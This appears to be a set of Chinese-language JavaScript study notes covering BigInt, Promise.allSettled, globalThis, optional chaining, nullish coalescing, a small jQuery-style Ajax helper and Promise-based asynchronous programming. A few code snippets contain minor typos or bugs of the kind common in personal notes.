> `BigInt`数据类型的目的是比`Number`数据类型支持的范围更大的整数值。在对大整数执行数学运算时，以任意精度表示整数的能力尤为重要。使用`BigInt`，整数溢出将不再是问题。
>
> 此外，可以安全地使用更加准确时间戳，大整数ID等，而无需使用变通方法。 `BigInt`目前是第3阶段提案， 一旦添加到规范中，它就是JS 第二个数字数据类型，也将是 JS 第8种基本数据类型：
>
> - Boolean
> - Null
> - Undefined
> - Number
> - BigInt
> - String
> - Symbol
> - Object
>
> 在节中，咱们将详细介绍`BigInt`，看看它如何解决使用`Number`类型的限制。

**问题**

对于学过其他语言的程序员来说，JS中缺少显式整数类型常常令人困惑。许多编程语言支持多种数字类型，如浮点型、双精度型、整数型和双精度型，但JS却不是这样。在JS中，按照[IEEE 754-2008](https://link.segmentfault.com/?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FIEEE_754-2008_revision)标准的定义，所有数字都以[双精度64位浮点](https://link.segmentfault.com/?url=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDouble_precision_floating-point_format)格式表示。

在此标准下，无法精确表示的非常大的整数将自动四舍五入。确切地说，JS 中的`Number`类型只能安全地表示`-9007199254740991 (-(2^53-1))` 和`9007199254740991(2^53-1)`之间的整数，任何超出此范围的整数值都可能失去精度。

```1c
console.log(9999999999999999);    // → 10000000000000000
```

该整数大于JS Number 类型所能表示的最大整数，因此，它被四舍五入的。意外四舍五入会损害程序的可靠性和安全性。这是另一个例子：

```abnf
// 注意最后一位的数字
9007199254740992 === 9007199254740993;    // → true
```

JS 提供`Number.MAX_SAFE_INTEGER`常量来表示 最大安全整数，`Number.MIN_SAFE_INTEGER`常量表示最小安全整数：

```javascript
const minInt = Number.MIN_SAFE_INTEGER;

console.log(minInt);         // → -9007199254740991

console.log(minInt - 5);     // → -9007199254740996

// notice how this outputs the same value as above
console.log(minInt - 4);     // → -9007199254740996
```

**解决方案**

为了解决这些限制，一些JS开发人员使用字符串类型表示大整数。 例如，[Twitter API](https://link.segmentfault.com/?url=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Fbasics%2Ftwitter-ids) 在使用 JSON 进行响应时会向对象添加字符串版本的 ID。 此外，还开发了许多库，例如 [bignumber.js](https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2FMikeMcl%2Fbignumber.js%2F)，以便更容易地处理大整数。

使用BigInt，应用程序不再需要变通方法或库来安全地表示`Number.MAX_SAFE_INTEGER`和`Number.Min_SAFE_INTEGER`之外的整数。 现在可以在标准JS中执行对大整数的算术运算，而不会有精度损失的风险。

要创建`BigInt`，只需在整数的末尾追加n即可。比较:

```1c
console.log(9007199254740995n);    // → 9007199254740995n
console.log(9007199254740995);     // → 9007199254740996
```

或者，可以调用`BigInt()`构造函数

```awk
BigInt("9007199254740995");    // → 9007199254740995n
```

`BigInt`文字也可以用二进制、八进制或十六进制表示

```awk
// binary
console.log(0b100000000000000000000000000000000000000000000000000011n);
// → 9007199254740995n

// hex
console.log(0x20000000000003n);
// → 9007199254740995n

// octal
console.log(0o400000000000000003n);
// → 9007199254740995n

// note that legacy octal syntax is not supported
console.log(0400000000000000003n);
// → SyntaxError
```

请记住，不能使用严格相等运算符将`BigInt`与常规数字进行比较，因为它们的类型不同：

```javascript
console.log(10n === 10);    // → false

console.log(typeof 10n);    // → bigint
console.log(typeof 10);     // → number
```

相反，可以使用等号运算符，它在处理操作数之前执行隐式类型转换

```abnf
console.log(10n == 10);    // → true
```

除一元加号(`+`)运算符外，所有算术运算符都可用于`BigInt`

```llvm
10n + 20n;    // → 30n
10n - 20n;    // → -10n
+10n;         // → TypeError: Cannot convert a BigInt value to a number
-10n;         // → -10n
10n * 20n;    // → 200n
20n / 10n;    // → 2n
23n % 10n;    // → 3n
10n ** 3n;    // → 1000n

const x = 10n;
++x;          // → 11n
--x;          // → 9n
```

不支持一元加号（`+`）运算符的原因是某些程序可能依赖于`+`始终生成`Number`的不变量，或者抛出异常。 更改`+`的行为也会破坏`asm.js`代码。

当然，与`BigInt`操作数一起使用时，算术运算符应该返回`BigInt`值。因此，除法(`/`)运算符的结果会自动向下舍入到最接近的整数。例如:

```basic
25 / 10;      // → 2.5
25n / 10n;    // → 2n
```

**隐式类型转换**

因为隐式类型转换可能丢失信息，所以不允许在`bigint`和 `Number` 之间进行混合操作。当混合使用大整数和浮点数时，结果值可能无法由`BigInt`或`Number`精确表示。思考下面的例子：

```excel
(9007199254740992n + 1n) + 0.5
```

这个表达式的结果超出了`BigInt`和`Number`的范围。小数部分的`Number`不能精确地转换为`BigInt`。大于`2^53`的`BigInt`不能准确地转换为数字。

由于这个限制，不可能对混合使用`Number`和`BigInt`操作数执行算术操作。还不能将`BigInt`传递给Web api和内置的 JS 函数，这些函数需要一个 `Number` 类型的数字。尝试这样做会报`TypeError`错误

```apache
10 + 10n;    // → TypeError
Math.max(2n, 4n, 6n);    // → TypeError
```

**请注意**，关系运算符不遵循此规则，如下例所示：

```awk
10n > 5;    // → true
```

如果希望使用`BigInt`和`Number`执行算术计算，首先需要确定应该在哪个类型中执行该操作。为此，只需通过调用`Number()`或`BigInt()`来转换操作数：

```awk
BigInt(10) + 10n;    // → 20n
// or
10 + Number(10n);    // → 20
```

当 `Boolean` 类型与`BigInt` 类型相遇时，`BigInt`的处理方式与`Number`类似，换句话说，只要不是`0n`，`BigInt`就被视为`truthy`的值：

```awk
if (5n) {
    // 这里代码块将被执行
}

if (0n) {
    // 这里代码块不会执行
}
```

排序`BigInts`和`Numbers`数组时，不会发生隐式类型转换：

```excel
const arr = [3n, 4, 2, 1n, 0, -1n];

arr.sort();    // → [-1n, 0, 1n, 2, 3n, 4]
```

位操作符如`|、&、<<、>>`和`^`对`Bigint`的操作方式与`Number`类似。下面是一些例子

```basic
90 | 115;      // → 123
90n | 115n;    // → 123n
90n | 115;     // → TypeError
```

**BigInt构造函数**

与其他基本类型一样，可以使用构造函数创建`BigInt`。传递给`BigInt()`的参数将自动转换为`BigInt`:

```javascript
BigInt("10");    // → 10n
BigInt(10);      // → 10n
BigInt(true);    // → 1n
```

无法转换的数据类型和值会引发异常:

```coffeescript
BigInt(10.2);     // → RangeError
BigInt(null);     // → TypeError
BigInt("abc");    // → SyntaxError
```

可以直接对使用构造函数创建的`BigInt`执行算术操作

```apache
BigInt(10) * 10n;    // → 100n
```

使用严格相等运算符的操作数时，使用构造函数创建的`Bigint`与常规`Bigint`的处理方式类似

```abnf
BigInt(true) === 1n;    // → true
```

**库函数**

在撰写本文时，`Chrome +67` 和`Opera +54`完全支持`BigInt`数据类型。不幸的是，`Edge`和`Safari`还没有实现它。`Firefox`默认不支持BigInt，但是可以在`about:config`中将`javascript.options.bigint` 设置为`true`来开启它，最新支持的情况可在“[Can I use](https://link.segmentfault.com/?url=https%3A%2F%2Fcaniuse.com%2F%23search%3Dbigint)”上查看。

不幸的是，转换`BigInt`是一个极其复杂的过程，这会导致严重的运行时性能损失。直接polyfill `BigInt`也是不可能的，因为该提议改变了几个现有操作符的行为。目前，更好的选择是使用[JSBI](https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2FGoogleChromeLabs%2Fjsbi)库，它是`BigInt`提案的纯JS实现。

这个库提供了一个与原生`BigInt`行为完全相同的API。下面是如何使用JSBI：

```javascript
import JSBI from './jsbi.mjs';

const b1 = JSBI.BigInt(Number.MAX_SAFE_INTEGER);
const b2 = JSBI.BigInt('10');

const result = JSBI.add(b1, b2);

console.log(String(result));    // → '9007199254741001'
```

使用`JSBI`的一个优点是，一旦浏览器支持，就不需要重写代码。 相反，可以使用`babel`插件自动将JSBI代码编译为原生 `BigInt`代码。

**总结**

`BigInt`是一种新的数据类型，用于当整数值大于`Number`数据类型支持的范围时。这种数据类型允许我们安全地对大整数执行算术操作，表示高分辨率的时间戳，使用大整数id，等等，而不需要使用库。

重要的是要记住，不能使用`Number`和`BigInt`操作数的混合执行算术运算，需要通过显式转换其中的一种类型。 此外，出于兼容性原因，不允许在`BigInt`上使用一元加号（`+`）运算符。

##### Promise.allSettled()

> 该`Promise.allSettled() `方法返回一个在所有给定的promise都已经`fulfilled`或`rejected`后的promise，并带有一个对象数组，每个对象表示对应的promise结果。
>
> 当您有多个彼此不依赖的异步任务成功完成时，或者您总是想知道每个`promise`的结果时，通常使用它。
>
> `这个方法解决了多个请求其中如果有失败的也可以单独处理，因为返回参数是每个对应的Promise，而不会报错触发catch,`
>
> `如果是all()方法请求中有一个失败则直接触发catch，不会触发then`
>
> 相比之下，`Promise.all()` 更适合彼此相互依赖或者在其中任何一个`reject`时立即结束。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled#句法)

```
Promise.allSettled(iterable);
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled#参数)

- `iterable`

  一个[可迭代的](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols)对象，例如[`Array`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array)，其中每个成员都是`Promise`。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled#返回值)

一旦所指定的 promises 集合中每一个 promise 已经完成，无论是成功的达成或被拒绝，**未决议的** [`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)将被**异步**完成。那时，所返回的 promise 的处理器将传入一个数组作为输入，该数组包含原始 promises 集中每个 promise 的结果。

对于每个结果对象，都有一个 `status` 字符串。如果它的值为 `fulfilled`，则结果对象上存在一个 `value` 。如果值为 `rejected`，则存在一个 `reason` 。value（或 reason ）反映了每个 promise 决议（或拒绝）的值。

**基本使用：**

```
const promise1 = Promise.resolve(3);
const promise2 = new Promise((resolve, reject) => setTimeout(reject, 100, 'foo'));
const promises = [promise1, promise2];

Promise.allSettled(promises).
  then((results) => results.forEach((result) => console.log(result.status)));

// expected output:
// "fulfilled"
// "rejected"
```

##### globalThis

> `提供了一个标准的方式去获取不同环境下的全局对象`
>
> JavaScript 语言越来越被广泛地用于各种环境中。除了 Web 浏览器（这是 JavaScript 的最常见的宿主环境类型）之外，你还可以在服务器，智能手机甚至机器人硬件中运行 JavaScript 程序。
>
> 每个环境都有其自己的对象模型，并提供了不同的语法来访问全局对象。例如，在Web浏览器中，可以通过 `window`，`self` 或 `frames` 访问全局对象。但是在 Node.js 中，这些属性不存在，而你必须使用 `global`。在 Web Worker 中，只有 `self` 可用。
>
> 这些引用全局对象的不同方式使编写能够在多个环境中工作的可移植 JavaScript 代码变得非常困难。幸运的是，有一个[正在开发中的提案](https://link.zhihu.com/?target=https%3A//github.com/tc39/proposal-global)打算通过引入一个名为 `globalThis` 的标准属性来解决这个问题，该属性将在所有环境中可用。
>
> 在本节中，我们将首先研究流行的 JavaScript 环境中的全局对象，然后看看 `globalThis` 是如何提供一种统一的机制来访问它。

**window**

`window` 属性用于在浏览器环境中引用当前文档的全局对象。在代码的顶层，使用 `var` 关键字声明的变量将成为 `window` 的属性，并且可能够在代码中的任何位置访问：

```js
var a = [10, 20];

console.log(window.a);          // → [10, 20]
console.log(a === window.a);    // → true
```

通常在使用 `window` 的属性时，由于隐含引用的缘故不必直接引用 `window`。但是当有一个与全局变量同名的局部变量时，使用 `window` 是唯一的选择：

```js
var a = 10;

(function() {
  var a = 20;   
  console.log(a);           // → 20
  console.log(window.a);    // → 10
})();
```

如你所见，无论代码在什么作用域内运行，`window` 对于引用全局对象都非常有用。注意，``window`实际上引用了 `window.window`。因此，`window.window === window`。

除了标准的 JavaScript 属性和方法之外，`window` 对象还包含其他一些属性和方法，这些属性和方法使我们能够控制 Web 浏览器窗口以及文档本身。

**self**

Web Workers API没有 `window` 对象，因为它没有浏览上下文。相反，它提供了 `WorkerGlobalScope` 接口，其中包含通常由 `WorkerGlobalScope` 承载的数据。

为了访问 Web Workers 中的全局对象，我们需要使用 `self`，它是 `Window` 对象的 `window` 属性的同义词。与 `window` 类似，`self` 是对全局对象的引用，可用于显式引用：

```js
// a web worker
console.log(self);    // => DedicatedWorkerGlobalScope {...}

var a = 10;

console.log(self.a);          // → 10
console.log(a === self.a);    // → true
```

在浏览器环境中，此代码将记录 `Window` 而不是 `DedicatedWorkerGlobalScope`。由于 `self` 的值会根据使用环境的不同而变化，所以有时最好使用 `Window`。 `self` 在 web worker 上下文中引用 `WorkerGlobalScope.self`，而在浏览器上下文中引用 `window.self`。

重要的是不要将 `self` 属性与声明局部变量（用于维护对上下文的引用）的常见 JavaScript 模式混淆。例如：

```js
const obj = {
  myProperty: 10,
  myMethod: function(){
    console.log(this === obj);    // => true

    // store the value of this in a variable for use in nested functions
    const self = this;

    const helperFunction = (function() {
      console.log(self === obj);  // => true (self refers to the outer this value)
      console.log(this === obj);  // => false (this refers to the global object. In strict mode, it has a value of undefined)
    })();
  }
};

// invoke myMethod on the object obj.
obj.myMethod();
```

**global**

在 Node.js 中，你可以使用 `global` 关键字访问全局对象：

```js
// node environment
console.log(global);    // => Object [global] {...}
```

`window`、 `self` 或 `frames` 在 Node 环境中不起作用。请记住，Node.js 中的顶级作用域不是全局作用域。在浏览器中，`var abc = 123` 将创建一个全局变量。但是在 Node.js 中变量是模块本身的局部变量。

**this**

在浏览器中，可以在程序的顶层使用 `this` 关键字来引用全局对象：

```js
this.foo = 123;
console.log(this.foo === window.foo);    // => true
```

`this` 在非严格模式下在函数或箭头函数内也引用全局对象。但是在严格模式下运行的函数就不是这种情况了，其中 `this` 的值为 `undefined`：

```js
(function() {
  console.log(this);    // => Window {...}
})();

(() => {
  console.log(this);    // => Window {...}
})();

(function() {
  "use strict";
  console.log(this);    // => undefined
})();
```

在 Node 模块中，顶层的 `this` 不引用全局对象。相反，它与 `module.exports` 具有相同的值。在函数内部（Node 环境），`this` 的值取决于函数的调用方式。在 JavaScript 模块中，顶层的 `this` 是 `undefined`。

**介绍 `globalThis`**

`globalThis` 旨在通过定义标准的全局属性来整合越来越分散的访问全局对象的方式。 `globalThis` 提案目前处于第 4 阶段，这意味着它已准备好纳入 ES2020 标准。所有流行的浏览器，包括 Chrome 71 +，Firefox 65+和Safari 12.1+，都已支持该功能。你也可以在 Node.js 12+ 中使用它。

```js
// browser environment
console.log(globalThis);    // => Window {...}

// node.js environment
console.log(globalThis);    // => Object [global] {...}

// web worker environment
console.log(globalThis);    // => DedicatedWorkerGlobalScope {...}
```

通过使用 `globalThis`，你的代码能够在窗口和非窗口上下文中工作，而无需编写其他检查或测试代码。在大多数环境中， `globalThis` 直接引用该环境的全局对象。但是在浏览器中，内部需要使用代理来考虑 iframe 和跨窗口安全性。实际上，它并不会改变你编写代码的方式。

通常，当你不确定要在哪种环境中使用代码时，或者当你想使代码在不同环境中可执行时，可以用 `globalThis` 属性。不过你必须用 polyfill 在不支持该功能的旧版浏览器上实现该功能。

另一方面，如果需要你确定要在什么环境中使用代码，请使用前面列举引用环境全局对象的现有方法之一，避免为 `globalThis` 添加 polyfill 的麻烦。

**创建一个 `globalThis` polyfill**

在引入 `globalThis` 之前，一种常用的跨环境访问全局对象的方法是使用以下模式：

```js
function getGlobalObject() {
  return Function('return this')();
}

if (typeof getGlobalObject().Promise.allSettled !== 'function') {
  // the Promise.allSettled() method is not available in this environment
}
```

这段代码的问题在于，在强制执行[内容安全策略（CSP）](https://link.zhihu.com/?target=https%3A//developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)的网站中不能用 `Function` 构造函数和 `eval`。由于CSP的缘故，Chrome 的扩展程序系统也不允许此类代码运行。

引用全局对象的另一种模式如下：

```js
function getGlobalObject() {
  if (typeof globalThis !== 'undefined') { return globalThis; }
  if (typeof self !== 'undefined') { return self; }
  if (typeof window !== 'undefined') { return window; }
  if (typeof global !== 'undefined') { return global; }
  throw new Error('cannot find the global object');
};

if (typeof getGlobalObject().Promise.allSettled !== 'function') {
  // the Promise.allSettled() method is not available in this environment
}
```

这种模式通常在 web 上使用。但也有[几个缺陷](https://link.zhihu.com/?target=https%3A//mathiasbynens.be/notes/globalthis%23naive-polyfill)，使其在某些情况下不可靠。幸运的是 Chrome DevTools 团队的Mathias Bynens [提出了一种创意模式](https://link.zhihu.com/?target=https%3A//mathiasbynens.be/notes/globalthis%23robust-polyfill)，它没有这些缺点：

```js
(function() {
  if (typeof globalThis === 'object') return;
  Object.defineProperty(Object.prototype, '__magic__', {
    get: function() {
      return this;
    },
    configurable: true // This makes it possible to `delete` the getter later.
  });
  __magic__.globalThis = __magic__; // lolwat
  delete Object.prototype.__magic__;
}());

// Your code can use `globalThis` now.
console.log(globalThis);
```

与其他方法相比，polyfill 是更可靠的解决方案，但仍然不够完美。正如 Mathias 提到的那样，修改`Object`、 `Object.defineProperty` 或 `Object.prototype.__defineGetter__` 可能会破坏 polyfill。

**总结**

能够用在多种环境中的可移植 JavaScript 代码很难编写。每个主机环境都有一个略有不同的对象模型。因此，要访问全局对象，你需要在不同的 JavaScript 环境中使用不同的语法。

通过引入 `globalThis` 属性，访问全局对象将变得更加简单，并且不再需要去检测代码所运行的环境。

乍一看 `globalThis` 似乎很容易实现。但是实际上，正确地进行操作是非常复杂的。现有的解决方法都不完美，如果不小心就可能会引入错误。

##### 可选链 ?.

> 可选链操作符( ?. )允许读取位于连接对象链深处的属性的值，而不必明确验证链中的每个引用是否有效。?. 操作符的功能类似于 . 链式操作符，不同之处在于，在引用为空(nullish ) (null 或者 undefined) 的情况下不会引起错误，该表达式短路返回值是 undefined。与函数调用一起使用时，如果给定的函数不存在，则返回 undefined。

上述是官方描述，举个例子对象嵌套了好多层，需要获得对象深层的值得时候，这就意味着你需要写很长的属性访问，如下：

```
const person = {
    details: {
        name: {
            newName: "aa",
            oldName: "aa",
        }
        age: "18",
    },
    jobs: [
        "H5",
        "Java"
    ]
} 
const personNewName = person.details.name.newName;
```

上面的代码如果我的person.details.name等任何一层数据有问题或者不存在的时候，js就会报错，我们一般会这么改进:

```
 const personNewName =  person && person.details && person.details.name person.details.name.newName|| '';
```

可以看到为了访问某个人的 newName，代码变得非常不优雅，会有多个&&代码量也很大。可选链 就是为了解决这个问题而诞生的。

**用法**
有了可选链操作符（?.），在访问 person.details.name.newName 之前，不再需要明确地校验 person.details.name 的状态，再并用短路计算获取最终结果：

```
const personFirstName = person?.details?.name?.firstName;
```

其实就是在属性访问符 . 的前面加了个问号。我们看上面语句中第一个 ?. ，从 JS 层面，它表示如果 person 的值为 null 或者 undefined，就不会报错而返回 undefined，否则才继续访问后面的 details 属性。而如果后面的属性访问链中有任何一个属性为 null 或者 undefined，那么最终的值就为 undefined。
这等价于以下表达式，但实际上没有创建临时变量：

```
let temp = person.details;
let nestedProp = ((temp === null || temp === undefined) ? undefined : temp.name);
let temp1 = person.details.name;
let nestedProp = ((temp1 === null || temp1 === undefined) ? undefined : temp1.firstName);
```

**可选链与函数调用**

函数调用时如果被调用的方法不存在，使用可选链可以使表达式自动返回undefined而不是抛出一个异常。

```
let result = someInterface.customMethod?.();
```

注意: 如果存在一个属性名且不是函数, 使用 ?. 仍然会产生一个 TypeError 异常 (x.y is not a function).
注意: 如果 someInterface 自身是 null 或者 undefined ，异常 TypeError 仍会被抛出 someInterface is null 如果你希望允许 someInterface 也为 null 或者 undefined ，那么你需要像这样写 someInterface?.customMethod?.()

**可选链和表达式**
当使用方括号与属性名的形式来访问属性时，你也可以使用可选链操作符：

```
let nestedProp = obj?.['prop' + 'Name'];
```

**可选链不能用于赋值**

```
let object = {};
object?.property = 1; // Uncaught SyntaxError: Invalid left-hand side in assignment
```

**可选链访问数组元素**

```
let arrayItem = arr?.[42];
```

##### Nullish coalescing Opearator空值合并运算符 ??

> [空值合并操作符（??）](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Nullish_coalescing_operator)英文名称为“**nullish coalescing operator**”，是一个逻辑操作符，**当左侧的操作数为 `null` 或者 `undefined` 时**，返回其右侧操作数，否则返回左侧操作数。

使用见下图：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020102216223448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29IYWlLdW9UaWFuS29uZzE2ODI=,size_16,color_FFFFFF,t_70#pic_center)

与逻辑或操作符（||）不同，逻辑或操作符会在左侧操作数为[虚值](https://developer.mozilla.org/zh-CN/docs/Glossary/Falsy)时返回右侧操作数。也就是说，如果使用 || 来为某些变量设置默认值，可能会遇到意料之外的行为。比如为[虚值](https://developer.mozilla.org/zh-CN/docs/Glossary/Falsy)（例如，`'' 或 0`）时。

见下图：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201022162722382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29IYWlLdW9UaWFuS29uZzE2ODI=,size_16,color_FFFFFF,t_70#pic_center)

**在 JavaScript 中只有 8 个 falsy 值（虚值）。**

> falsy 值 (虚值) 是在 Boolean 上下文中认定为 false 的值。

1. `false`
2. `0`
3. `-0`
4. `0n`
5. `NaN`
6. `null`
7. `undefined`
8. `空字符串: 双引号 "", 单引号 '', 或 模板字面量 `` `

#### Ajax

简单实现

```
//jquery简单实现
; (function (window) {
  var jquery = function (selector) {
    return new jquery.prototype.init(selector);
  };
  jquery.prototype = {
    init: function (selector) {
      return markArray(this, document.querySelectorAll(selector))
    },
    get (url, data, callback, type) {
      if (url === 'undefined') return;
      if (data) {
        var mySearchParams = new URLSearchParams()
        for (const key in data) {
          mySearchParams.append(key, data[key]);
        }
        var urlArr = url.split("?");
        if (urlArr[1] === "" || urlArr[1] === undefined) {
          urlArr += mySearchParams.toString();
        } else {
          urlArr[1] += "&" + mySearchParams.toString();
        }
        var url = urlArr[0] + "?" + urlArr[1]
      }
      const req = new XMLHttpRequest();
      req.responseType = type ? type : "json"
      req.open('GET', url);
      req.send();
      if (callback === undefined) {
        return new Promise((resolve, reject) => {
          // 处理结果
          req.onload = function () {
            if (req.readyState === 4) {
              if (req.status >= 200 && req.status < 300) {
                resolve(req.response);
              } else {
                reject(req.status);
              }
            }
          }
        })
      } else {
        req.onload = function () {
          callback(req.response)
        }
      }
      return this;
    },
    post (url, data, callback, type) {
      var req = new XMLHttpRequest();
      req.open("POST", url);
      // req.setRequestHeader("content-type", "application/x-www-form-urlencoded")
      req.onload = function () {
        if (callback) {
          callback(req.response)
        }
      }
      req.send(data)
      return this;
    },
    serialize (data) {
      var formData = null
      if (data.constructor === Object) {
        formData = new FormData();
        for (const key in data) {
          formData.append(key, data[key])
        }
      }
      return formData
    }
  }
  //挂载jquery原型给init构造函数
  jquery.prototype.init.prototype = jquery.prototype
  function markArray (that, dom) {
    for (let index = 0; index < dom.length; index++) {
      if (dom.length === 1) {
        return that = dom[index]
      }
      that[index] = dom[index]
    }
  }
  Object.assign(jquery, jquery.prototype)
  window.jquery = window.$ = jquery
}(window))
```

使用：

```
	$.get("https://api.ipify.org/?format=json", { c: 111, d: '1221' }, function (data) {
      console.log(data);
    })
    async function test2() {
      const xhr = await test1();
      console.log(xhr);
      const res = await $.get("https://api.ipify.org/?format=json").then(res => { res.a = 2; return res })
      console.log('我是第三个');
      console.log(res);
    }
    async function test1() {
      const res1 = await $.get("https://api.ipify.org/?format=json")
      console.log('我是第一个');
      console.log(res1);
      const res2 = await $.get("https://api.ipify.org/?format=json")
      console.log('我是第二个');
      console.log(res2);
      return '1111111'
    }
    test2()
```

执行结果：

![image-20210811025235862](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210811025236.png)





#### 异步编程

> 由于某些事件占用的时间比较长，甚至不确定，所以我们不能等待上面的所有代码才往下执行，所以就出现了异步的解决方法，
>
> javascript采用了event loop的机制来进行处理

**但是由于异步的机制**，我们也会遇到一些问题，比如我们进行一些网络请求，或者一些读写请求，但是由于这些事件属于异步事件，所以它们会

在所有同步代码都执行完毕才会执行，这样就会导致我们无法获取到对应的数据。

比如：

```
     let data
     function getData () {
       setTimeout(() => {
         data = 1000
       }, 1000);
     }
     getData()
     console.log(data);  //undefined
```

那么这个问题我们应该怎么解决呢？有以下一些方案：

##### 普通回调函数

```
     function getData () {
          setTimeout(() => {
          	data = 1000;
         		 console.log(data);  //1000
          }, 1000);
     }
     getData()
```

但是如果有多个异步依赖，就会引起回调地狱：

```
     const fs = require('fs')
     fs.readFile('./1.txt', 'utf-8',(err, result1) => {
       console.log(result1)
       fs.readFile('./2.txt', 'utf-8',(err, result2) => {
         console.log(result1+result2)
         fs.readFile('./3.txt', 'utf-8',(err, result3) => {
           console.log(result1+result2+result3)
         })
       })
     })
```

这样是没问题的，但是如果嵌套进一步增加，那么就很不友好了

下面我们对普通回调函数进行优化

##### 回调函数优化

```
     function fn1() {
       fs.readFile('./1.txt', 'utf-8', (err, result1) => {
         console.log(result1)
         fn2(result1)
       })
     }
     function fn2 (result1) {
       fs.readFile('./2.txt', 'utf-8', (err, result2) => {
         console.log(result1+result2)
         fn3(result1 + result2)
       })
     }
     function fn3 (result2) {
       fs.readFile('./3.txt', 'utf-8', (err, result3) => {
         console.log(result2+result3)
       })
     }
     fn1()
```

这样看起来就优雅了很多了

但是这样仍然有一个问题，如果有一百个异步事件，那么我们是不是得创建100个函数来包裹它？

这样的话不仅会污染全局，而且也难现实，因为有些请求我们是动态去请求的，不能提前定义好

下面我介绍ES6中的Promise解决方法

##### Promise

> Promise类就是为了解决上面的问题，我们只需要new Promise，那么异步事件就会被promise包裹，等事件执行完毕就会调用resolve()
>
> 相当于上面的调用回调函数

###### 基本使用

直接上代码吧

```
//使用Promise优化
function p1 () {
  return new Promise((resolve, reject) => {
    fs.readFile('./1.txt', 'utf8', (err, result1) => {
      if (err != null) {
        reject(err)
      } else {
        resolve(result1)
      }
    })
  })
}
function p2 (r1) {
  return new Promise((resolve, reject) => {
    fs.readFile('./2.txt', 'utf8', (err, result2) => {
      if (err != null) {
        reject(err)
      } else {
        resolve(r1 + result2)
      }
    })
  })
}
function p3 (r2) {
  return new Promise((resolve, reject) => {
    fs.readFile('./3.txt', 'utf8', (err, result3) => {
      if (err != null) {
        reject(err)
      } else {
        resolve(r2 + result3)
      }
    })
  })
}
p1().then((r1) => {
  console.log(r1)
  return p2(r1)
})
  .catch((err) => {
    console.log(err)
    return p2()
  })
  .then((r2) => {
    console.log(r2)
    return p3(r2)
  })
  .catch((err) => {
    console.log(err)
    return p3()
  })
  .then((r3) => {
    console.log(r3)
  })
  .catch((err) => {
    console.log(err)
  })
```

虽然上面也需要new Promise(),但我们使用ajax或者axios的时候，它们会自动new Promise的，不需要我们动手，这样就很方便了

###### Promise简单实现

```
class myPromise {
  constructor(executor) {
    //Promise状态
    this.status = 'pending'
    this.result
    // 监听的回调，使用then\catch方法添加
    this.resolveCallback = []
    executor(this.resolve.bind(this))
  }
  resolve (value) {
    //模拟微任务
    setTimeout(() => {
      if (this.status === 'pending') {
        this.result = value
        this.resolveCallback.forEach(item => item(value))
      }
    },0)
  }
  then (success) {
    const newPromise = new myPromise((resolve) => {
      if (this.status === 'pending') {
        this.resolveCallback.push(() => {
          this.result = success(this.result)
          this.handPromise(this.result, newPromise, resolve)
        })
      }
    })
    return newPromise
  }
  handPromise (result, newPromise, resolve) {
    if (result instanceof myPromise) {
      result.then.call(result, (r) => {
        this.handPromise(r, newPromise, resolve)
        // resolve(r)
      })
    } else {
      resolve(result)
    }
  }
}
module.exports = myPromise
```

调用：

```
const myPromise = require('./Promise')

const test = new myPromise((resolve) => {
  setTimeout(() => {
    resolve('测试')
  }, 1000);
}).then((res) => {
  console.log(res)
  return res + '1'
}).then(res => {
  console.log(res)
  return new myPromise((resolve) => {
    setTimeout(() => {
      resolve(res + 'hahah')
    }, 1000);
  })
}).then(res => {
  console.log(res)
  return new myPromise((resolve) => {
    setTimeout(() => {
      resolve(res + 'hahah')
    }, 1000);
  })

}).then(res => {
  console.log(res);
})
```



###### Promise.all

> Promise.all() 方法接收一个promise的iterable类型（注：Array，Map，Set都属于ES6的iterable类型）的输入，并且只返回一个[`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)实例， 那个输入的所有promise的resolve回调的结果是一个数组。这个[`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)的resolve回调执行是在所有输入的promise的resolve回调都结束，或者输入的iterable里没有promise了的时候。它的reject回调执行是，只要任何一个输入的promise的reject回调执行或者输入不合法的promise就会立即抛出错误，并且reject的是第一个抛出的错误信息。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/all#语法)

```
Promise.all(iterable);
```

**基本使用：**

```
const promise1 = Promise.resolve(3);
const promise2 = 42;
const promise3 = new Promise((resolve, reject) => {
  setTimeout(resolve, 100, 'foo');
});

Promise.all([promise1, promise2, promise3]).then((values) => {
  console.log(values);   // [3, 42, "foo"]
});
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/all#参数)

- iterable

  一个[可迭代](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols#The_iterable_protocol)对象，如 [`Array`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array) 或 [`String`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String)。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/all#返回值)

